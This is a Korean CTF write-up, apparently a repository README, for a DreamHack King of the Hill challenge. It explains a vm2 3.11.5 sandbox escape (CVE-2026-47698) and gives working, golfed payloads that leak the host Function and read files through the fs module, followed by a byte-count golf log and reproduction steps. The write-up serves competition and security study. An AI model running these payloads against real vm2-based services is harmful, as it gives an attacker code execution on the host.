# nodejail — KotH (vm2 3.11.5 sandbox escape)

DreamHack **King of the Hill** 문제 `nodejail` 풀이.

제출물은 `.js` 페이로드. 서버가 공개된 `runner.js` 안에서
`new VM({ timeout: 2000 })` (**vm2 3.11.5**) 로 실행한다. 샌드박스를 탈출해
`/flag.txt` 를 읽고 **그대로** stdout 에 출력해야 한다. flag 는 라운드마다 바뀌므로
(44바이트, 후행 개행 없음) 상수로 박으면 안 되고 매번 읽어야 한다.

**순위 = 페이로드 바이트 수(짧을수록 높음).** 그래서 익스 확보 후의 싸움은 코드 골프다.

## 취약점

**CVE-2026-47698 / GHSA-cfcw-xp6x-25gj** — vm2 ≤ 3.11.5 (3.11.6 에서 패치).
Node 버전 무관하게 동작한다(다른 두 vm2 1day 는 Node 26 전용).

GHSA-v6mx-mf47-r5wg 패치는 `Function.prototype.call` 인다이렉션을 **한 겹**만
벗겨서 위험한 host proto mutator 호출을 막았다. 한 겹 더 쌓으면
(`indirectcall.call(indirectcall, mutator, ...)`) 탐지를 통과한다.

### 흐름
1. `WebAssembly.compileStreaming()` 가 던지는 **host-realm 에러**를 첫 catch 에서 받는다.
2. 이중 인다이렉션 호출로 host `__proto__` setter 를 불러, 그 에러의 **공유 프로토타입의
   `[[Prototype]]` 을 null 로 끊는다**. 이제 그 클래스의 프로토타입 체인은 등록된
   mapping(결국 host `Object.prototype`)에 닿지 못한다.
3. 두 번째 `compileStreaming()` 에러는 체인이 끊겨 있어 bridge 가 매핑을 못 찾고,
   3.11.5 는 이를 **raw 로 넘긴다**.
4. raw host 에러 → `e.constructor.constructor` = host `Function` → host `process` → `fs`
   로 flag 를 읽어 출력.

접근자를 직접(`c.__lookupSetter__(p)`) 가져오면 vm2 가 정화하므로, **fetch 도 론더링**해야 한다.

## 최종 페이로드 — 266 bytes (`payload.js`)

```js
c=Buffer.call;C=c.bind(c);p="__proto__";W=WebAssembly.compileStreaming;W().catch(e=>{C(C(c.__lookupSetter__,c,p),C(C(c.__lookupGetter__,c,p),e),null);W().catch(e=>e.toString.constructor`console.log(process.mainModule.require('fs').readFileSync('/flag.txt')+'')`())})
```

### 더 짧은 변형 — 264 bytes (`payload-modern.js`, Node ≥ 20.16 / 22.3 전용)

`process.mainModule.require('fs')` → `process.getBuiltinModule('fs')` (−2). `getBuiltinModule`
은 Node 20.16 / 22.3 이상에서만 존재하므로 **서버 Node 버전을 알 때만** 쓴다. 버전 불확실하면
266 바이트 `payload.js` 가 안전하다.

- `c=Buffer.call` — host `Function.prototype.call`. `C=c.bind(c)` 가 이중 인다이렉션 호출기.
  (`Buffer` 만 `.call` 로 host call 을 흘린다 — `Date`/`Array` 등 샌드박스 전역은 안 된다.)
- `W=WebAssembly.compileStreaming` — this 없이 `W()` 로 불러도 host-realm 에러를 던진다.
  취약점이 **async 브릿지**이므로 트리거는 반드시 비동기여야 한다(동기 throw 는 vm2 가 되감아 막는다).
- 루프/`async` IIFE 대신 promise `.catch` 로 시퀀싱: 첫 catch 에서 SEVER 하고 그 안에서
  둘째 `W()` 를 다시 던져 raw 에러를 유출한다.
- host `Function` 은 **raw 로 유출된 에러**에서만 나온다. raw 에러의 host 함수 프로퍼티면
  아무거나 `.constructor` 가 host `Function` 이라, `e.constructor.constructor` 대신
  더 짧은 `e.toString.constructor` 를 쓴다(`valueOf` 는 안 됨 — 검증 완료).
  샌드박스에서 직접 `Buffer.call.constructor` 를 쓰면 vm2 가 정화해 샌드박스 Function 이 된다.
- Function 본문은 **태그드 템플릿**으로 넘겨 `("…")` 괄호를 뺀다. 버퍼는 `+''` 로 문자열화.
  `console.log` 의 후행 개행은 채점 시 무시(양끝 공백/개행만 무시, 중간은 유효).

## 골프 기록

| bytes | 변경 |
|------:|------|
| 335 | 최초 동작본 (CVE-2026-47698, 폴드된 host Function 문자열) |
| 333 | 출력 `+\`\`` 로 버퍼 문자열화 (`,\`utf8\`` 제거) |
| 320 | `w` 별칭 제거 — WASM 호출을 루프 본문에 인라인(소스 1회) |
| 311 | 론더링 헬퍼 `C` 도입 + `Buffer`→`B` 별칭 |
| 309 | `{}.__lookup*` → `c.__lookup*` |
| 308 | `[0,1]` → `[,1]` |
| 295 | `C=(...a)=>c.call(c,...a)` → `C=c.bind(c)` |
| 291 | `B` 제거, 조회 thisArg 로 `c` 재사용 |
| 284 | `async`+`for-of` 루프 제거 → `W` 별칭 + promise `.then` 체인 |
| 276 | `.then` 체인 → 중첩 `.catch` (둘째 트리거를 첫 catch 안으로) |
| 271 | `W=_=>…()` 화살표 별칭 → `W=…compileStreaming` (this 불필요) |
| 269 | Function 생성 `("…")()` → 태그드 템플릿 `` `…`() `` |
| 266 | `e.constructor.constructor` → `e.toString.constructor` (버전 무관) |
| 264 | `process.mainModule.require('fs')` → `process.getBuiltinModule('fs')` (Node ≥ 20.16/22.3) |

바닥 근접: 남은 큰 덩어리(WASM 트리거 / `process.mainModule.require().readFileSync` /
Function-템플릿 / 4회 론더링 호출)는 전부 익스 본질이라 못 줄인다. 검증한 막다른 길:
`Buffer`→더 짧은 전역(`Set`/`Map`/`URL`/`Date`/`Error`/`Proxy`/`Reflect`/`globalThis` 등
15개 전부 host call 유출 안 됨 — `Buffer` 만 통과), `compileStreaming`→`compile`/`fetch`
(각각 동기 throw / 샌드박스에 없음), 직접 lookup(정화됨), sever 대상 `null`→`[]`/`{}`(안 끊김),
getter 생략하고 `e` 직접 sever(인스턴스 proto 라 공유 proto 안 끊김), bare `require`/`global.require`
(host Function 스코프에 없음), `e.valueOf.constructor`(동작 안 함), `Buffer.call.constructor`
직접 RCE(정화됨). 더 내리려면 Node-26 전용 경로(CVE-2026-92944, async+stack overflow,
WASM/Buffer 불필요) 같은 구조가 다른 익스가 필요.

## 로컬 재현

```bash
cd solve
bash test.sh            # vm2@3.11.5 설치 후 flag 출력 확인
# 실제 환경: echo 'DH{...}' | sudo tee /flag.txt ; cat ../payload.js | node runner.js
```

## 제출

```bash
KOTH_TOKEN=<your-token> python submit.py
```

토큰은 커밋하지 않는다(환경변수/인자). 검증 통과 시 자동으로 채점 대상이 된다.

## 참고
- https://github.com/advisories/GHSA-cfcw-xp6x-25gj (CVE-2026-47698)
- https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9 (vm2 @@species, 선행 기법)
